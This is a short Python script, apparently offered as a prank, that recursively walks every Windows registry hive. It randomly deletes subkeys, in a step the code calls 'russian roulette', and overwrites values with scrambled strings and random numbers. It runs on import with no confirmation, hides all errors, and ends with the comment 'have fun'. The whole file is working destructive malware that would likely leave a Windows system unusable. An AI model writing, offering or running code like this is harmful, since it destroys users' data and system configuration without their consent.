from random import *
import winreg

def fuck(value_data, damage):
    if type(value_data) == str:
        new = ""
        if randint(1, 100) in [n for n in range(damage)]: 
            for c in value_data:
                new += chr(ord(c) + randint(-10, 10))
        else:   
            new = value_data
        return new
    elif value_data == 0 or value_data == 1:
        if randint(1, 100) in [n for n in range(damage)]:
            return 1
        else:
            return 0
    else:
        return randint(0, 69)

def get_keys(key, damage, parent_path=""):
    try:
        subkey_count, _, _ = winreg.QueryInfoKey(key)
        for i in range(subkey_count):
            subkey_name = winreg.EnumKey(key, i)
            subkey_path = "\\".join([parent_path, subkey_name])

            try:
                if randint(1, 6) == 6: # play russian roulette
                    winreg.DeleteKey(key, subkey_name)
                subkey = winreg.OpenKey(key, subkey_name, access=winreg.KEY_ALL_ACCESS)

                try:
                    value_name, value_data, value_type = winreg.EnumValue(subkey, 0)
                    try:
                        try:
                            new_value_data = fuck(value_data, damage)
                        except Exception:
                            pass
                        winreg.SetValueEx(subkey, value_name, 0, value_type, new_value_data)
                    except Exception :
                        pass
                except Exception:
                    pass

                get_keys(subkey, damage, parent_path=subkey_path)

                winreg.CloseKey(subkey)
            except Exception:
                pass
    except Exception:
        pass

def regfuck(reghive, damage):
    hive = winreg.ConnectRegistry(None, reghive)
    root_key = winreg.OpenKey(hive, '', access=winreg.KEY_READ)
    get_keys(root_key, damage)
    winreg.CloseKey(root_key)
    winreg.CloseKey(hive)

# let me help u out here:
for h in [winreg.HKEY_USERS, winreg.HKEY_CURRENT_USER, winreg.HKEY_CURRENT_CONFIG, winreg.HKEY_CLASSES_ROOT, winreg.HKEY_LOCAL_MACHINE]:
  regfuck(h, randint(85,100))
  # have fun
